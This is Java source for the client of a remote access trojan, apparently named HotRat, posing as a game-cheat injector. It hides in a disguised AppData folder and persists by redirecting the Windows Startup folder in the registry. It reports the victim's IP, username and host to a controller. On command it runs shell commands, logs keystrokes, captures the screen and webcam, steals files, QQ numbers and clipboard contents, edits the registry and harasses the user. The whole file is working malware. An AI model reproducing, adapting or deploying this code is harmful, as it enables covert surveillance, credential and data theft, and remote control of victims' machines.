package me.client;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.*;
import me.client.send.*;
import me.client.filecopy.Copy;
import me.client.filecopy.JarUtil;
import me.client.utils.*;
import me.client.utils.Dialog;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;

import java.awt.*;
import java.io.*;
import java.net.*;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import javax.imageio.ImageIO;
import javax.swing.*;

public class Client {
    public static boolean isturn = false;
    public static Socket socket;

        public static String getPath() throws IOException {
            File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Windows");
            if(!file.exists()) {
                file.mkdirs();
                Runtime.getRuntime().exec("attrib " + file.getAbsolutePath() + " +H");//隐藏文件夹
            }
            return file.getPath();
        }

        public static void lock() {
        try {
            File file = new File(System.getProperty("user.home") + "\\AppData"  + "\\me.lock");
            Runtime.getRuntime().exec("attrib " + file.getAbsolutePath() + " +H");
            file.deleteOnExit();
            file.createNewFile();
            RandomAccessFile randomAccessFile = new RandomAccessFile(file,"rw");
            FileChannel fileChannel = randomAccessFile.getChannel();
            FileLock fileLock =  fileChannel.tryLock();
            if(fileLock == null) {
                System.exit(0);
            }
        }catch (Exception e) {
        }
    }

    public static void fake() throws IOException {
        JDialog dialog = new JDialog();
        JTextField textField = new JTextField(20);
        JLabel label = new JLabel("路径");
        InputStream inputStream = Client.class.getClassLoader().getResourceAsStream("me/client/resources/Fake.png");
        Image image = ImageIO.read(inputStream);
        dialog.setIconImage(image);
        JPanel jpanel = new JPanel();
        dialog.setLocationRelativeTo(null);
        JButton button = new JButton("开始注入");
        JTextArea textArea = new JTextArea();
        textArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane();
        scrollPane.setViewportView(textArea);
        dialog.add(scrollPane);
        textArea.append("欢迎使用HotRat注入工具" + "\n");
        textArea.append("请点击开始注入 自动注入" + "\n");
        textArea.append("by me135 请勿对本软件进行逆向 破解 感谢使用" + "\n");
        jpanel.add(button);
        jpanel.add(label);
        jpanel.add(textField);
        dialog.add(jpanel, BorderLayout.SOUTH);
        dialog.setTitle("HotRat注入工具");
        dialog.setSize(500, 230);
        dialog.setVisible(true);
        button.addActionListener(a -> {
            try {
                textArea.append("注入中..." + "\n");
                Thread.sleep(200);
                textArea.append("cheat.dll..." + "\n");
                Thread.sleep(250);
                textArea.append("AntiCheck.dll..." + "\n");
                Thread.sleep(1200);
                textArea.append("注入成功!");
            } catch (InterruptedException e) {
            }
        });
    }

    public static void register() throws IOException {
        File file = new File(getPath()+"\\java.ico.jar");
        if(!file.exists()) {
            fake();
            JarUtil jarUtil = new JarUtil(Client.class);
            String path = jarUtil.getJarPath();
            if (!path.equalsIgnoreCase(getPath())) {
                path += "\\" + jarUtil.getJarName();
                Copy copy = new Copy(path);
                copy.copy();//复制被控端本体
                Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getPath());
            }
        }else {
            System.out.println("return null");
        }
    }

    public static void relieve() throws IOException {
        //解除主机
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
        File file = new File(getPath() + "\\java.ico.jar");
        file.deleteOnExit();
    }

    public static void main(String[] args) throws Exception {
        UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");

        try {

            while (!isturn) {
                Thread.sleep(1000);
                con();
            }
        }catch (Exception e) {
        }
    }

    public static void con() {
        try {
            InetSocketAddress address = new InetSocketAddress("127.0.0.1",11451);
            socket = new Socket();
            socket.connect(address);
            isturn = true;
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
            dataOutputStream.writeUTF(GetInternetIP.getIP());
            dataOutputStream.writeUTF(System.getProperty("user.name"));
            dataOutputStream.writeUTF(InetAddress.getLocalHost().getHostName());
            dataOutputStream.writeUTF(System.getProperty("os.name"));
            dataOutputStream.writeUTF(GetInternetIP.getRegion());
            dataOutputStream.flush();
            SendHeartPack.run = true;
            new Thread(new SendHeartPack(socket,dataOutputStream)).start();
            new Thread(new Listen(dataInputStream,socket)).start();
        }catch (Exception e) {
            isturn = false;
        }
    }

    public static void recon() {
        while (!isturn) {
            try {
                con();
                Thread.sleep(1000);
            }catch (Exception e) {
            }
        }
    }
}

class Listen implements Runnable{
    class Lock extends Thread{
        boolean turn = false;
        @Override
        public void run() {
            while (turn) {
                try {
                    Thread.sleep(5);
                    Robot robot = null;
                    robot = new Robot();
                    robot.mouseMove(0, 0);
                } catch (Exception e) {
                }

            }
        }
    }

    class Press extends Thread{
        int key;
        public Press(int key) {
            this.key = key;
        }
        boolean turn = false;
        @Override
        public void run() {
            while (turn) {
                try {
                    Robot robot = new Robot();
                    robot.keyPress(key);
                    robot.delay(5);
                    robot.keyRelease(key);
                } catch (Exception e) {
                }
            }
        }
    }

    private Socket socket;
    private DataInputStream dataInputStream;
    private Press press;
    private Lock lock;
    private SendScreen send;
    private Getkeyboard getkeyboard;
    private Chat chat;
    private CameraListen cameraListen;

    public Listen(DataInputStream dataInputStream,Socket socket) {
        this.dataInputStream = dataInputStream;
        this.socket = socket;
    }
    public static void change(String img){
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,
                "Control Panel\\Desktop", "Wallpaper", img);
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,
                "Control Panel\\Desktop", "WallpaperStyle", "10");
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,
                "Control Panel\\Desktop", "TileWallpaper", "0");

        int SPI_SETDESKWALLPAPER = 0x14;
        int SPIF_UPDATEINIFILE = 0x01;
        int SPIF_SENDWININICHANGE = 0x02;

        boolean result = User32.INSTANCE.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0,
                img, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE );
    }

    public interface User32 {
        User32 INSTANCE = Native.loadLibrary("user32", User32.class);
        boolean SystemParametersInfoA(int uiAction, int uiParam, String fnm, int fWinIni);
    }

    public void Screen(String s,DataOutputStream dataOutputStream) throws IOException {
        if(s.indexOf("Start")!=-1) {
            send = new SendScreen(dataOutputStream, socket);
            send.run = true;
            send.start();
        } else if (s.indexOf("Stop")!=-1) {
            send.run = false;
        }
    }

    public void lockm(String s) {
        if(s.indexOf("Locking")!=-1) {
            lock = new Lock();
            lock.turn = true;
            lock.start();
        }else if(s.indexOf("Unlock")!=-1) {
            lock.turn = false;
        }
    }

    public void getKeyboard(String s,DataOutputStream dataOutputStream) {
        if(s.indexOf("Start")!=-1) {
            getkeyboard = new Getkeyboard(dataOutputStream);
            getkeyboard.start();
        } else if (s.indexOf("Stop")!=-1) {
            getkeyboard.setHookOff();
        }
    }

    public void camera(String s,OutputStreamWriter writer) {
        if(s.indexOf("Start")!=-1) {
            cameraListen = new CameraListen(socket,writer);
            cameraListen.run = true;
            cameraListen.start();
        } else if (s.indexOf("Stop")!=-1) {
            cameraListen.webcam.close();
            cameraListen.run = false;
        }
    }

    public void keyboard(String s) {
        if(s.indexOf("Start")!=-1) {
            press = new Press(Integer.parseInt(s.substring(18)));
            press.turn = true;
            press.start();
        }else if(s.indexOf("Stop")!=-1) {
            press.turn = false;
        }
    }

    @Override
    public void run() {
        try {
            while (true) {
                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream());
                InputStreamReader reader = new InputStreamReader(socket.getInputStream());
                String str = "";
                Thread.sleep(1);
                char[] chars = new char[512];
                int len = 0;
                len = reader.read(chars);
                str = new String(chars,0,len);
                if (str.indexOf("-SetClipboard") != -1) {
                    SetClipboard.setClipboard(str.substring(14));
                }

                if (str.indexOf("-GetClipboard") != -1) {
                    new SetClipboard(writer).start();
                }

                if(str.indexOf("-Camera")!=-1) {
                    camera(str,writer);
                }

                if(str.indexOf("-FileO")!=-1) {
                    try {
                        File file = new File(str.substring(7));
                        Desktop desktop = Desktop.getDesktop();
                        if (desktop.isSupported(Desktop.Action.OPEN)) {
                            desktop.open(file);
                        }
                    } catch (IOException e) {
                    }
                }

                if(str.indexOf("-FileCopy")!=-1) {
                    String s = str.substring(10);
                    String s1 = s.substring(0,s.indexOf(":path"));
                    String s2 = s.substring(s.indexOf(":path")+5);
                    File file = new File(s1);
                    File file1 = new File(s2);
                    file1.createNewFile();
                    FileUtils.copyFile(file,file1);
                }

                if(str.indexOf("-RemoteChat")!=-1) {
                    chat = new Chat(socket);
                    chat.getMSG(writer);
                }

                if(str.indexOf("-MEG")!=-1) {
                    String str1 = str.substring(5);
                    chat.jta.append(str1);
                    if(str1.indexOf("end")!=-1) {
                        writer.write("end");
                        writer.flush();
                        chat.jWindow.dispose();
                    }
                }

                if(str.indexOf("-FileG")!=-1) {
                    SendFileList sendFileList = new SendFileList(writer,str.substring(7),socket);
                    sendFileList.sendDiskInfo();
                }

                if (str.indexOf("-Screen") != -1) {
                    Screen(str, dataOutputStream);
                }

                if (str.indexOf("-TaskKill") != -1) {
                    try {
                        System.out.println(str.substring(10));
                        Runtime.getRuntime().exec("taskkill /f /PID " + str.substring(10));
                    } catch (IOException e) {
                    }
                }

                if (str.indexOf("-emptybackground") != -1) {
                    change("fuckyou");
                }

                if(str.indexOf("-hidewindow")!=-1) {
                    FindWindow findWindow = new FindWindow(str.substring(12),writer,socket);
                    findWindow.hide();
                }

                if(str.indexOf("-fileGet")!=-1) {
                    SendFile sendFile = new SendFile(socket,str.substring(9));
                    new Thread(sendFile).start();
                }

                if(str.indexOf("-showwindow")!=-1) {
                    FindWindow findWindow = new FindWindow(str.substring(12),writer,socket);
                    findWindow.show();
                }

                if (str.indexOf("-QQNumber") != -1) {
                    new SendQQNumber(writer, socket).start();
                }

                if (str.indexOf("-File") != -1) {
                    new SendFileList(writer, str.substring(6), socket).start();
                }

                if (str.indexOf("-FileD") != -1) {
                    File file = new File(str.substring(7));
                    file.delete();
                }

                if (str.indexOf("-Lockmouse") != -1) {
                    lockm(str);
                }

                if (str.indexOf("-Randompress") != -1) {
                    keyboard(str);
                }

                if (str.indexOf("-Tasklist") != -1) {
                    new SendTaskList(writer, socket).start();
                }

                if (str.indexOf("-FileC") != -1) {
                    File file = new File(str.substring(7));
                    file.createNewFile();
                }

                if(str.indexOf("-regF")!=-1) {
                    SendRegistry sendRegistry = new SendRegistry(writer,socket,str.substring(6));
                    sendRegistry.start();
                }

                if(str.indexOf("-regD")!=-1) {
                    SendRegistry sendRegistry = new SendRegistry(writer,socket,str.substring(6,str.indexOf(":path")));
                    sendRegistry.DeleteValue(str.substring(str.indexOf(":path") + 5,str.indexOf(":key")));
                }

                if(str.indexOf("-FileW")!=-1) {
                    File file = new File(str.substring(7,str.indexOf(":path")));
                    BufferedWriter writer1 = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(str.substring(7,str.indexOf(":path")))));
                    writer1.write(str.substring(str.indexOf(":path") + 5,str.indexOf(":content")));
                    writer1.flush();
                    writer1.close();
                }

                if(str.indexOf("-FileL")!=-1) {
                    SendFileContent sendFileContent = new SendFileContent(socket,writer,str.substring(7));
                    sendFileContent.start();
                }

                if (str.indexOf("-beep") != -1) {
                    Toolkit toolkit = Toolkit.getDefaultToolkit();
                    toolkit.beep();
                }
                if (str.indexOf("-SystemInfo") != -1) {
                    new SendSystemInfo(writer, socket).start();
                }
                if (str.indexOf("-cmd") != -1) {
                    try {
                       Process process = Runtime.getRuntime().exec(str.substring(5));
                       BufferedReader reader1 = new BufferedReader(new InputStreamReader(process.getInputStream()));
                       String str1 = "";
                       while ((str1 = reader1.readLine())!=null) {
                           writer.write(str1 + "\n");
                           writer.flush();
                       }
                        writer.write("end");
                        writer.flush();
                    } catch (IOException e) {
                    }
                }
                if (str.indexOf("-notification1") != -1) {
                    Dialog.dialog2(str.substring(14));
                }
                if (str.indexOf("-notification2") != -1) {
                    Dialog.dialog4(str.substring(14));
                }
                if (str.indexOf("-notification3") != -1) {
                    Dialog.dialog1(str.substring(14));
                }
                if (str.indexOf("-notification4") != -1) {
                    Dialog.dialog3(str.substring(14));
                }
                if (str.indexOf("-notification5") != -1) {
                    Dialog.dialog5(str.substring(14));
                }
                if (str.indexOf("-FlashBomb") != -1) {
                    new FlashBomb(str.substring(11));
                }
                if(str.indexOf("-regC1")!=-1) {
                    SendRegistry sendRegistry = new SendRegistry(writer,socket,str.substring(7,str.indexOf(":path")));
                    sendRegistry.StringValue(str.substring(str.indexOf(":path") + 5,str.indexOf(":key")),str.substring(str.indexOf(":key") + 4,str.indexOf(":value")));
                }
                if(str.indexOf("-regC2")!=-1) {
                    SendRegistry sendRegistry = new SendRegistry(writer,socket,str.substring(7,str.indexOf(":path")));
                    sendRegistry.LongValue(str.substring(str.indexOf(":path") + 5,str.indexOf(":key")),str.substring(str.indexOf(":key") + 4,str.indexOf(":value")));
                }
                if(str.indexOf("-regC3")!=-1) {
                    SendRegistry sendRegistry = new SendRegistry(writer,socket,str.substring(7,str.indexOf(":path")));
                    sendRegistry.ExpandableStringValue(str.substring(str.indexOf(":path") + 5,str.indexOf(":key")),str.substring(str.indexOf(":key") + 4,str.indexOf(":value")));
                }
                if (str.indexOf("-Relieve") != -1) {
                    Client.relieve();
                    System.exit(0);
                }
                if (str.indexOf("-Keyboard") != -1) {
                    getKeyboard(str, dataOutputStream);
                }
                if (str.indexOf("-browse") != -1) {
                    try {
                        Desktop desktop = Desktop.getDesktop();
                        if (desktop.isSupported(Desktop.Action.BROWSE)) {
                            desktop.browse(new URI(str.substring(8)));
                        }
                    } catch (IOException | URISyntaxException e) {
                    }
                }
            }

        }catch (Exception e) {
        }
    }
}